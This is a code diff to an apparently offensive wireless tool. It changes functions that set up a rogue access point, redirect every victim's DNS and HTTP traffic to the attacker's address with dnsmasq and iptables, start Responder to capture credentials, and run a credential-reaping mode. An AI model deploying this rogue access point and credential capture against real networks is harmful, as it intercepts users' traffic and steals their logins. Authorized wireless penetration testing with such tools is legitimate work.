@@ -6,6 +6,7 @@ import config
 import time
 
 from core import cert_manager, conf_manager, utils, responder
+from core.servers.redirect_server import RedirectServer
 from argparse import ArgumentParser
 from config import __version__
 
@@ -70,13 +71,22 @@ def hostile_portal():
         os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 
-        # start dhcp and dns: all dns queries should resolve to PHY
-        utils.Dnsmasq.hardstart('-C %s > dnsmasq.log 2>&1' % config.dnsmasq_cnf)
-        utils.Dnsspoof.hardstart('-i %s -f %s > dnsspoof.log 2>&1' % (options['interface'], config.dnsspoof_cnf))
+        # configure dnsmasq
+        conf_manager.dnsmasq_captive_portal_cnf.configure(
+                                        interface=options['interface'],
+                                        log_file=config.dnsmasq_log,
+                                        dhcp_script=config.dhcp_script)
+        
+        utils.Dnsmasq.hardstart('-C %s 2>&1' % config.dnsmasq_cnf)
+
+        # start RedirectServer
+        rs = RedirectServer.get_instance()
+        rs.configure('10.0.0.1')
+        rs.start()
 
         # start Responder
         responder = responder.Responder.get_instance()
-        responder.configure()
+        responder.configure(interface=options['interface'])
         responder.start()
 
         # set iptables policy, flush all tables for good measure
@@ -88,13 +98,14 @@ def hostile_portal():
         utils.Iptables.route_dns2_addr('10.0.0.1', options['interface'])
         utils.Iptables.route_http2_addr('10.0.0.1', options['interface'])
 
-        # pause execution until use quits
-        raw_input('press enter to quit...')
+        # pause execution until user quits
+        raw_input('Press enter to quit...')
 
         # kill daemons
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
-        utils.Dnsspoof.kill()
+        responder.stop()
+        rs.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -107,6 +118,8 @@ def hostile_portal():
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
         utils.Dnsspoof.kill()
+        responder.stop()
+        rs.stop()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -116,6 +129,7 @@ def hostile_portal():
 def captive_portal():
 
     try:
+
         # prepare environment
         utils.NetworkManager.stop()
         utils.WPASupplicant.stop()
@@ -143,9 +157,13 @@ def captive_portal():
         os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 
-        # start dhcp and dns: all dns queries should resolve to PHY
-        utils.Dnsmasq.hardstart('-C %s > dnsmasq.log 2>&1' % config.dnsmasq_cnf)
-        utils.Dnsspoof.hardstart('-i %s -f %s > dnsmasq.log 2>&1' % (options['interface'], config.dnsspoof_cnf))
+        # configure dnsmasq
+        conf_manager.dnsmasq_captive_portal_cnf.configure(
+                                        interface=options['interface'],
+                                        log_file=config.dnsmasq_log,
+                                        dhcp_script=config.dhcp_script)
+        
+        utils.Dnsmasq.hardstart('-C %s 2>&1' % config.dnsmasq_cnf)
 
         # start httpd
         utils.Httpd.start()
@@ -159,13 +177,12 @@ def captive_portal():
         utils.Iptables.route_dns2_addr('10.0.0.1', options['interface'])
         utils.Iptables.route_http2_addr('10.0.0.1', options['interface'])
         
-        # pause execution until use quits
+        # pause execution until user quits
         raw_input('press enter to quit...')
 
         # kill daemons
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
-        utils.Dnsspoof.kill()
 
         # stop services
         utils.Httpd.stop()
@@ -180,7 +197,6 @@ def captive_portal():
         # kill daemons
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
-        utils.Dnsspoof.kill()
         
         # restore iptables to a clean state (policy, flush tables)
         utils.Iptables.accept_all()
@@ -202,7 +218,7 @@ def reap_creds():
         utils.wlan_clean(options['interface'])
         utils.Hostapd.hardstart('-s %s ' % config.hostapd_cnf, verbose=False)
 
-        # pause execution until use quits
+        # pause execution until user quits
         raw_input('press enter to quit...')
 
         utils.Hostapd.kill()
